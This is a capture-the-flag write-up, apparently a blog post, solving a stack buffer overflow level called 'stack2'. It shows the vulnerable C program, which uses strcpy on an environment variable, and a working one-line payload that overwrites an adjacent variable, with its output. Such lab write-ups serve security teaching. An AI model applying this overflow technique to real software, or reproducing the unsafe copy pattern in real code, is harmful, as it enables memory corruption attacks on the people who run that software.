Let’s take a look at the source code…

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

So right off the bat, it looks like we are going to have to do a buffer overflow attack. However it doesn’t look like we will be able to directly input data into the function, but however it imports data from an environmental variable named “GREENIE”. It also takes GREENIE, and copies it over to buffer which is only big enough to hold 64 characters. In addition to that it is looking for a specific value just like the last problem.

So we can try to essentially deliver the same attack we did in stack1, however we set it equal to the environmental variable GREENIE. If you didn’t do stack1, essentially we just fill up the buffer with 64 ascii characters, then we append the value we want to change to that on the end (since it is hex, we have to format it as little endian). 

```
GREENIE=`python -c ‘print “1”*64 + “\x0a\x0d\x0a\x0d”’` ./stack2
you have correctly modified the variable
```

And it just like that we pwned the program
